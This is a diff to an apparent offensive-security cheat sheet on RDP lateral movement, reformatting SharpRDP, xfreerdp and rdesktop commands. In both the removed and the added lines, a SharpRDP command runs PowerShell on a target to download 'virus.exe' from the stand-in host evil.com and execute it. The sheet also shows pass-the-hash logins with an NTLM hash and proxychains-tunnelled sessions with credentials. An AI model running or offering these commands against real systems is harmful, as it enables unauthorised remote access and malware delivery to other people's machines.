@@ -40,13 +40,9 @@ SharpRDP.exe computername=target command=notepad username=domain\user password=p
 
 #### Remote code Execution
 
-```text
-sharprdp.exe computername=target command="powershell (New-Object
-System.Net.WebClient).DownloadFile('http://evil.com/virus.exe',
-'C:\Windows\Tasks\virus.exe'); C:\Windows\Tasks\virus.exe" username=domain\user password=password!
+```csharp
+sharprdp.exe computername=target command="powershell (New-Object System.Net.WebClient).DownloadFile('http://evil.com/virus.exe', 'C:\Windows\Tasks\virus.exe'); C:\Windows\Tasks\virus.exe" username=domain\user password='password!'
 ```
-
-
 
 ## Linux RDP
 
@@ -55,18 +51,18 @@ System.Net.WebClient).DownloadFile('http://evil.com/virus.exe',
 #### Domain + NTLM hash
 
 ```csharp
-xfreerdp /d:domain  /u:user  /pth:NTLM_HASH  /v:DEST_IP
+xfreerdp /d:domain /u:user /pth:NTLM_HASH /v:DEST_IP /smart-sizing:1920x1080
 ```
 
-#### Local machine
+#### Local machine or local account
 
 ```csharp
-proxychains  xfreerdp   /u:b3v1l /p:Password!  /v:172.16.1.16
+proxychains  xfreerdp /u:b3v1l /p:'Password!'  /v:172.16.1.16 /smart-sizing:1920x1080
 ```
 
 ### rdesktop
 
 ```csharp
-rdesktop DEST_IP   -u Domain\User -p Password
+rdesktop DEST_IP  -u Domain\User -p Password
 ```
 
